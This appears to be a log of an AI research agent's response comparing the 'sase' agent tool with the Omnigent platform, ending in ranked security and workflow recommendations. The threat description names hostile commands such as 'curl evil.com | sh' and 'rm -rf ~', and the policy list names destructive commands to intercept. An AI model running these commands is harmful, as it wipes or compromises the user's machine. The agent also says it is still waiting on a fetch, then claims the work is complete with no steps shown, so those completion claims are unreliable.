# Chat History - ace-run (research.0h.gem)

- **TIMESTAMP:** 2026-10-07 17:24:37 EDT
- **MODEL:** agy/gemini-3.8-flash-high
- **AGENT:** research.0h.gem
- **PROMPT:** `~/.sase/multi_prompts/202610/gh_sase_org__sase-multiprompt-261007_171417.md`

## Prompt

%id(gem, clan=research.0h)
%m:agy/gemini-3.8-flash-high %q(1.5x, w=0.25)
#gh:gh_sase-org__sase 
You are researcher gem in a 5-researcher swarm.
The other researchers, `research.0h.cdx`, `research.0h.cld`, `research.0h.grk`, `research.0h.mus`, are independently investigating the same request and will write their own self-named reports ending in `__cdx.md` and `__cld.md` and `__grk.md` and `__mus.md`. Your report will end in `__gem.md`.

Conduct your research independently and form your own conclusions. Do NOT attempt to
locate, open, read, or otherwise consult the other researcher's report from this swarm,
even if it becomes available before you finish. Do not obtain that peer's findings
indirectly through its chat transcript, summaries, or requests to the peer. You may
independently use the same external sources, shared input material, and unrelated prior
research. You may check filenames or file existence to avoid overwriting your own
output, but do not inspect the peer's report contents. If you encounter its filename,
leave the report alone. The lead researcher will read every report and synthesize their
findings after you have all finished.

Can you do some research with the goal of comparing sase with omniagent (see the code
and documentation at https://github.com/omnigent-ai/omnigent for context)? End your
analysis with a ranked list of recommended changes you think I should consider making to
sase based on this comparison. 
Write this research to a new markdown file under the $(sase repo path research --ensure)/$(date +%Y%m)/ directory.
Choose a descriptive filename stem yourself, but the filename MUST end with the
`__gem` suffix, i.e. `<stem>__gem.md` (double underscore before the
suffix). Create the report without overwrite: if the exact file already exists, pick a
different stem instead of replacing it.


After the write succeeds, register the report as a durable snapshot:

sase artifact create -p "<absolute-report-path>" -l "research:<repo-relative-report-path>"

Use the report's actual absolute path and its path relative to the research repo root
(for example `research:202609/topic__a.md`), including any subdirectory the steps above
put it in. Do not derive the label from the current month, the clock, or a guessed name.
Do not pass `--move`; the source stays in the research repo for later reorganization. If
registration itself fails, report that failure — do not report the research task as
fully complete.

## Response

I have launched `sase repo open omnigent-ai/omnigent` to fetch and materialize the repository locally for research and am waiting for it to complete.
### Research Summary: SASE vs. Omnigent (Omniagent)

The research comparing **SASE** with **Omnigent** (`https://github.com/omnigent-ai/omnigent`) has been completed independently and written to disk. The report has been successfully registered as a durable artifact.

* **Report File:** [`/home/bryan/.local/state/sase/workspaces/sase-org/sase/sase_19/sase/repos/research/202610/sase_vs_omniagent_comparative_analysis__gem.md`](file:///home/bryan/.local/state/sase/workspaces/sase-org/sase/sase_19/sase/repos/research/202610/sase_vs_omniagent_comparative_analysis__gem.md)
* **Durable Artifact Ref:** `file:explicit:6f68da4cc284cb8d2dd92d76`
* **Artifact Label:** `research:202610/sase_vs_omniagent_comparative_analysis__gem.md`
* **Stored Snapshot Path:** `/home/bryan/.sase/artifacts/agents/gh_sase-org__sase/20261007171423/sase_vs_omniagent_comparative_analysis__gem-76ff4777b9e0.md`

---

### Core Findings & Comparison Overview

#### 1. Fundamental Paradigm Differences
* **SASE (Structured Agentic Software Engineering):** A deterministic, lifecycle-centric software engineering operating system. SASE treats LLMs as ephemeral, single-turn batch workers (`single-turn-agents`) embedded in a structured engineering environment. It enforces **host-owned completion** (`host-owned-completion`), state outside chat transcripts (Git-portable Beads, ChangeSpecs/Patches, Memory Webs), numbered ephemeral workspace isolation (`sase_<N>`) borrowing Git alternates, two-speed CI verification receipts (`receipts-prove-before-they-skip`), and a deterministic Rust core (`sase-core`).
* **Omnigent:** An open-source, multi-device, interactive **meta-harness** and multi-agent collaboration platform. It normalizes both native interactive CLI harnesses (Claude Code, Cursor, Codex, OpenCode, Hermes, Pi, Antigravity, Devin, Grok, Kiro, Qwen) via tmux/PTY bridges and headless SDK harnesses into a uniform multi-turn session model. It prioritizes ubiquitous accessibility (Web UI, mobile apps, native macOS desktop app with OS notifications), live multi-user collaboration (session sharing, co-driving, forking), defense-in-depth sandboxing (Bubblewrap, Seatbelt, Job Objects, cloud sandboxes), secretless credential proxying, and a three-tier declarative policy engine (Admin, Developer, User).

#### 2. Key Architectural Divergence
| Dimension | SASE | Omnigent |
| :--- | :--- | :--- |
| **Agent Contract** | **Single-Turn Agents**: Atomic provider turns; host owns continuation | **Multi-Turn Sessions**: Continuous interactive chat & tool execution loops |
| **Completion Ownership** | **Host-Owned**: Agents declare intent; host validates & finalizes commits/PRs | **Agent/User-Owned**: Agents manage branches/PRs; human merges |
| **State Paradigm** | **State Outside Transcripts**: Beads, ChangeSpecs, Memory Webs, ToolRun ledger | **Session Event Store**: Message logs, live attachments, WebSocket state, DB |
| **Runtime Boundary** | Python host + required Rust core (`sase-core`) | Python server/runner + React/Vite Web + Electron/Native Desktop |
| **Workspace Strategy** | Numbered ephemeral clones (`sase_<N>`) borrowing Git alternates | Caller process, Git worktrees, Copy-on-Write tmpfs overlays, cloud sandboxes |
| **Process Isolation** | Directory isolation; host user privileges (sudo gates) | Kernel namespaces (`bwrap`), `seatbelt`, Job Objects, Cloud sandboxes |
| **Credential Security** | Direct environment variable & host file access | **Secretless L7 Credential Proxy**: Placeholder tokens & egress filtering |
| **Governance & HITL** | Turn-based **Gates (`gates-never-block`)** & Textual TUI (ACE) | 3-tier declarative policies (ALLOW/DENY/ASK), Web/Desktop PTY approval cards |

---

### Ranked List of Recommended Changes for SASE

Based on the comparative analysis, here is the prioritized list of architectural recommendations for SASE:

#### 1. First-Class OS-Level Sandboxing for Numbered Workspaces (Critical — Security)
* **Context:** SASE isolates agents by cloning repositories into numbered directories (`sase_<N>`), but the agent subprocess runs with full host user privileges. A hallucinated or malicious command (`rm -rf ~`, `curl evil.com | sh`, or tampering with `~/.ssh`) can compromise the developer's entire machine.
* **Recommendation:** Integrate an OS sandbox abstraction into SASE's subprocess launcher (`src/sase/llm_provider/_subprocess.py` and Rust core admission). On Linux, execute agent commands inside **Bubblewrap (`bwrap`)**, unsharing IPC, PID, and UTS namespaces, mounting `/` read-only, bind-mounting only the assigned `sase_<N>` workspace directory and managed temp directory (`$SASE_TMPDIR`) as writable, and masking sensitive host paths (`~/.ssh`, `~/.aws`, `~/.gnupg`, `~/.config/sase/secrets.yml`). On macOS, wrap executions in compiled `sandbox-exec` (Seatbelt) profiles.

#### 2. Secretless L7 Credential Proxying & Egress Filtering (High — Security & Compliance)
* **Context:** SASE passes real API keys (`ANTHROPIC_API_KEY`, `GEMINI_API_KEY`, GitHub tokens) directly into the agent subprocess environment. Prompt injection or untrusted third-party dependencies could exfiltrate these credentials.
* **Recommendation:** Implement a lightweight local L7 egress proxy daemon under the SASE Service Host (`sase service`). Replace real credentials in the agent's environment with placeholder tokens (e.g. `sase_cred_gh_xxx`). Route sandboxed network traffic through the proxy, which validates outgoing domains against an allowlist (e.g., `github.com`, `api.anthropic.com`), swaps placeholder headers with valid authentication tokens on egress, and rejects unapproved destinations.

#### 3. Declarative Multi-Tier Policy Engine (ALLOW / DENY / ASK) (High — Governance & Cost Control)
* **Context:** SASE currently handles human intervention procedurally through gate turns (`Question Gates`, `Plan Gates`, `Sudo Gates`), but lacks a declarative rule engine to intercept tool calls and shell commands before execution.
* **Recommendation:** Create a declarative policy framework (`src/sase/policy/`), configurable in `~/.config/sase/sase.yml` (user-level) and project `sase/sase.yml`. Evaluate actions against rules returning `ALLOW`, `DENY`, or `ASK`:
  * `cost_budget`: Automatically trigger an approval gate when soft spend thresholds are reached and enforce hard budget caps.
  * `ask_on_dangerous_tools`: Intercept destructive shell commands (`git push --force`, `dd`, `mkfs`, package managers) and convert them directly into SASE Question/Approval Gates.
  * `vcs_branch_fence`: Deny or gate agents attempting to push or write directly to protected branches (`master`, `main`, `release/*`).
  * `max_turn_tool_calls`: Terminate turns that exceed tool invocation limits to prevent infinite loops.

#### 4. Copy-on-Write (CoW) Ephemeral Scratches via OverlayFS / tmpfs (Medium — Performance & I/O)
* **Context:** Every parallel agent requires a numbered Git clone (`sase_<N>`). While Git alternates save disk space, directory creation, checkouts, and cleanups incur latency during rapid swarms or exploratory research tasks.
* **Recommendation:** For read-mostly exploration tasks, research swarms, and quick diff reviews, implement an ephemeral workspace provider backed by Linux **OverlayFS** or memory-backed tmpfs. Mount the primary repository as the read-only lower layer and a private tmpfs directory as the writable upper layer. Exploratory turns run with zero clone latency, and the overlay is discarded instantly on completion.

#### 5. PTY & Elicitation Bridging for Native Vendor CLIs (Medium — Ecosystem Parity)
* **Context:** SASE runs vendor CLIs in non-interactive batch mode (`--print`). When a vendor CLI (like Claude Code, Cursor, or Kiro) attempts to prompt the user for permission or interactive clarification, the run either aborts or stalls.
* **Recommendation:** Implement a pseudo-terminal (PTY) wrapper in SASE (`src/sase/llm_provider/pty_driver.py`) that monitors vendor CLI streams for interactive approval patterns. When detected, the PTY driver automatically packages the prompt into a native SASE **Question Gate Turn** (`question_gate_turn`). Once answered in the TUI/CLI, the response is injected into the PTY stdin, bridging native vendor CLI interactivity seamlessly into SASE's single-turn contract.

#### 6. Formalized Cross-Vendor Heterogeneous Verification Workflows (Medium — Code Quality)
* **Context:** While SASE supports multi-agent swarms (`%swarm`), members typically run the same model. There is no built-in architectural pattern enforcing that code authored by one model vendor is audited by a competing model before submission.
* **Recommendation:** Introduce a standardized macro workflow (`#cross_vendor_review` or `#audit_pipeline`, inspired by Omnigent's Polly orchestrator). When an agent completes an implementation phase in workspace `sase_A` using Provider X (e.g. Claude 3.7 Sonnet), the workflow captures the diff snapshot and dispatches an audit agent in workspace `sase_B` using Provider Y (e.g. Gemini 2.5 Pro or OpenAI o3) with an explicit review contract before host finalizers run.

#### 7. Cloud Sandbox Provider Adapters for AXE & Dispatches (Low-Medium — Scalability)
* **Context:** SASE dispatch (`%dispatch`) currently relies on pre-configured persistent remote machines reachable via SSH, lacking dynamic provisioning for burst parallel workloads.
* **Recommendation:** Extend SASE's workspace and machine provider abstraction (`src/sase/workspace_provider/`) to support on-demand cloud sandbox providers (e.g., Daytona, Modal, E2B). Dynamically spin up disposable containers, sync workspace state via Git bundles, run agent turns, stream artifacts back, and tear down instances upon completion.

#### 8. Web & Mobile Supervision Gateway Upgrades (Low-Medium — Developer Experience)
* **Context:** SASE's primary interface is the Textual TUI (`sase tui`). While powerful for terminal use, answering urgent gates or monitoring long-running agents while away from the machine is constrained.
* **Recommendation:** Upgrade SASE's mobile gateway service (`sase service`) with a lightweight, responsive web interface accessible over Tailscale or Cloudflare tunnels. Provide mobile-optimized views for real-time agent status inspection, one-tap gate decisions (Plan, Question, and Sudo gates), and web push notifications on turn completion.

---

The full research document is available at [`sase/repos/research/202610/sase_vs_omniagent_comparative_analysis__gem.md`](file:///home/bryan/.local/state/sase/workspaces/sase-org/sase/sase_19/sase/repos/research/202610/sase_vs_omniagent_comparative_analysis__gem.md) and tracked under artifact ref `file:explicit:6f68da4cc284cb8d2dd92d76`.

Final declaration for the dirty research repository (`repo-9bf900ad4f21`, `202610/sase_vs_omniagent_comparative_analysis__gem.md`) was submitted and accepted with commit message:

`docs(research): comparative analysis of sase vs omniagent with ranked recommendations`
